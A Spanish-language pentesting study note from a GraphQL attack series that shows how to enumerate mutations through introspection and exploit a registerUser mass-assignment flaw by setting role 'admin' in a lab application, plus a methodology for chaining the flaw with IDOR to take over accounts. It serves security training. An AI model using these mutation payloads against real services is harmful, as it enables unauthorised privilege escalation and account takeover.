---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - GraphQL
Fecha de actualización: 2026-07-15
Nota previa: "[[04 - Denegación de servicio (DoS) y Batching]]"
Nota siguiente: "[[06 - Detección, evasión y prevención de GraphQL]]"
Area: "[[GraphQL.base|GraphQL]]"
---
---

Hasta ahora solo hemos **leído** datos. Las <mark style="background: #ADCCFFA6;">**mutations** son las queries de GraphQL que **modifican** datos del servidor</mark>: crear, actualizar o borrar objetos. Son el equivalente a los `POST`/`PUT`/`DELETE` de REST, y un terreno directo para escalar privilegios.

# Enumerar las mutations

Primero, la [[01 - Information Disclosure|introspección]] del `mutationType` para ver qué mutations existen y qué argumentos aceptan:

```graphql
query {
  __schema {
    mutationType {
      name
      fields { name args { name defaultValue type { name kind ofType { name kind } } } }
    }
  }
}
```

Identificamos una mutation `registerUser` que crea usuarios y requiere un objeto `RegisterUserInput`. Enumeramos sus campos:

```graphql
{
  __type(name: "RegisterUserInput") {
    inputFields { name description defaultValue }
  }
}
```

Resultado: podemos aportar `username`, `password`, `role` y `msg`. <mark style="background: #FF5582A6;">El campo `role` bajo nuestro control es la señal de alarma</mark>.

# Ejecutar la mutation

La app espera la contraseña como hash `MD5`:

```shell-session
$ echo -n 'password' | md5sum
5f4dcc3b5aa765d61d8327deb882cf99  -
```

Registramos el usuario (los campos en el cuerpo de la mutation se devuelven, útil para comprobar errores):

```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user { username password msg role }
  }
}
```

Ya podemos loguearnos con el nuevo usuario.

# Explotación: escalada de privilegios

El paso clave es examinar **qué** podemos poner en cada argumento. Como el registro acepta `role`, y sabemos (por enumerar usuarios) que existe el rol `admin`, creamos un usuario **admin** directamente:

```graphql
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user { username role }
  }
}
```

La respuesta refleja `role: "admin"`. Nos logueamos y accedemos al endpoint interno `/admin`: <mark style="background: #FF5582A6;">escalada de privilegios completa</mark>. El backend deja fijar un campo (`role`) que el usuario **nunca** debería controlar durante el registro.

> [!important]+ Esto es mass assignment
> Es el mismo bug que en [[03 - Broken Object Property Level Authorization (API3)|BOPLA/Mass Assignment de APIs]] y en el [[11 - Encadenamiento de IDOR|IDOR de Web Attacks]] (ponernos `role: web_admin`). GraphQL lo hace especialmente visible porque la introspección **te enseña** todos los campos de entrada aceptados. <mark style="background: #8000E1A6;">Enumera siempre los `inputFields` de cada mutation y busca campos de privilegio</mark> (`role`, `isAdmin`, `verified`, `balance`, `price`).

# Metodología con mutations

1. Introspección de **todas** las mutations y sus `inputFields`.
2. Buscar mutations de **creación/modificación de usuarios, roles, permisos, pagos**.
3. Probar valores privilegiados en campos sensibles (`role: "admin"`).
4. Combinar con [[02 - IDOR en GraphQL|IDOR]]: si una mutation `updateUser` no valida a **quién** modificas, editas cuentas ajenas (cambiar su email → password reset → [[11 - Encadenamiento de IDOR|account takeover]]).
5. Ojo con las mutations sin autenticación (registro, reset, feedback) — suelen tener menos controles.

Cerramos la explotación de GraphQL. Las notas finales consolidan la [[06 - Detección, evasión y prevención de GraphQL|detección/evasión]] y las [[07 - Herramientas para GraphQL|herramientas]].

## Referencias

- PortSwigger — [Working with GraphQL mutations](https://portswigger.net/web-security/graphql)
- OWASP — [GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- HTB Academy — *Attacking GraphQL* (base, 2024)
